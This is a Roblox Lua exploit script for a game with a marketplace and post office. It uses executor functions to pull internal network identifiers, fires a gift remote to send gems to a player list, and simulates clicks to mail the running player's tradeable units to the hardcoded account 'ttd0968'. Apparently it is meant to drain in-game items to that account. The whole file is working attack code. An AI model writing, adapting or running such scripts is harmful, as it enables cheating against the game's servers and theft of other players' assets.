-- Wait for the game to load and necessary elements to be available
repeat wait() until game:IsLoaded()
repeat wait() until game.Players.LocalPlayer
local Plr = game.Players.LocalPlayer
repeat wait() until Plr.Character
repeat wait() until Plr.Character:FindFirstChild("HumanoidRootPart")
repeat wait() until Plr.Character:FindFirstChild("Humanoid")

local Plrgui = game:GetService("Players").LocalPlayer.PlayerGui
print("Step 1: Game and player loaded")

local function ConvertGradientToRGB(v, num)
    local color = v.Color.Keypoints[num].Value
    local r = math.floor(color.R * 255)
    local g = math.floor(color.G * 255)
    local b = math.floor(color.B * 255)
    return Color3.fromRGB(r, g, b)
end

print("Step 2: Function ConvertGradientToRGB defined")

local RarityColor = {}
for _, v in pairs(Plrgui.Lobby.MarketplaceFrame.MarketplaceMain.MainFrame.BuyMenu.FilterBar.Rarities:GetChildren()) do
    if v:IsA("Frame") then
        RarityColor[v.Name] = {
            ["1"] = ConvertGradientToRGB(v.FilterButton[v.Name], 1),
            ["2"] = ConvertGradientToRGB(v.FilterButton[v.Name], 2)
        }
    end
end

print("Step 3: RarityColor table populated")

local function GetRarity(color1, color2)
    for rarity, colors in pairs(RarityColor) do
        if (color1 == colors["1"] and color2 == colors["2"]) then
            return rarity
        end
    end
end

local function GetRandomUnit()
    for _, v in pairs(Plrgui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do
        if v:IsA("Frame") then
            local UnitRarity = GetRarity(ConvertGradientToRGB(v.TroopPicture.RarityGradient, 1), ConvertGradientToRGB(v.TroopPicture.RarityGradient, 2))
            if not v.TroopPicture.CannotTrade.Visible and (UnitRarity == "Basic" or UnitRarity == "Uncommon" or UnitRarity == "Rare") then
                return v
            end
        end
    end
end

print("Step 4: Functions GetRarity and GetRandomUnit defined")

-- Function to click a GUI button
local function ClickButton(a)
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(a.AbsolutePosition.X + a.AbsoluteSize.X / 2, a.AbsolutePosition.Y + 50, 0, true, a, 1)
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(a.AbsolutePosition.X + a.AbsoluteSize.X / 2, a.AbsolutePosition.Y + 50, 0, false, a, 1)
end

print("Step 5: Function ClickButton defined")

-- Function to detect invocation
local function DetectInvoke()
    local a = require(game:GetService("ReplicatedStorage").MultiboxFramework)
    for i, v in next, getupvalues(getupvalues(a.Network.Invoke)[1])[5] do
        if i == "PostOffice_SendGift" then
            return v.SendBridge._identifier
        end
    end
end

print("Step 6: Function DetectInvoke defined")

-- Function to generate a random string
local function Random(Length)
    local alphabet = "0123456789"
    local n = string.len(alphabet)
    local pw = {}
    for i = 1, Length do
        pw[i] = string.byte(alphabet, math.random(n))
    end
    return string.char(table.unpack(pw))
end

print("Step 7: Function Random defined")

-- Main loop
spawn(function()
    while wait() do
        pcall(function()
            if DetectInvoke() ~= nil then
                print("Step 8: DetectInvoke is not nil")
                for i, v in pairs(getgenv().PlayerList) do
                    local for_gem = string.char(math.random(97, 122))
                    local gem_only = {
                        [1] = {
                            [1] = {
                                [1] = Random(64),
                                [2] = v,
                                [3] = for_gem,
                                [4] = for_gem,
                                [5] = getgenv().Gem,
                                [6] = ""
                            },
                            [2] = DetectInvoke()
                        }
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(gem_only))
                end
                break
            else
                print("Step 9: DetectInvoke is nil")
                if Plrgui.Lobby.PostOffice.Visible then
                    local Unit = GetRandomUnit()
                    if Unit then
                        if Unit.TroopPicture.IsInTrade.Visible then
                            if Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text == "ttd0968" then
                                ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Send.SendButton)
                            else
                                Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text = "ttd0968"
                            end
                        else
                            for _, v in pairs(Plrgui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do
                                if v:IsA("Frame") then
                                    if v ~= Unit then
                                        v.Visible = false
                                    end
                                end
                            end
                            ClickButton(Unit)
                        end
                    end
                else
                    local PostOfficeHandler = getsenv(Plrgui.Lobby.PostOffice.PostOfficeHandler)
                    PostOfficeHandler:OpenFrame()
                end
            end
        end)
    end
end)

print("Main script executed")
